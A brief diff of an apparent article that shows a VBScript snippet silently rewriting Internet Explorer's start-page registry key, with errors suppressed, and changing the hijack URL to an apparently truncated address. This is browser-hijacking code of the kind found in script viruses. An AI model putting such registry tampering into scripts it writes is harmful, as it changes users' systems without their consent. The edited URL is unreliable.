@@ -45,7 +45,7 @@ Here is the code:
 
 On Error Resume Next
 Set wsc = CreateObject("WScript.Shell")
-wsc.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "http://www.rrlf.de/"
+wsc.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "http://www.wescam.u"
 
 -------------------------------------
 
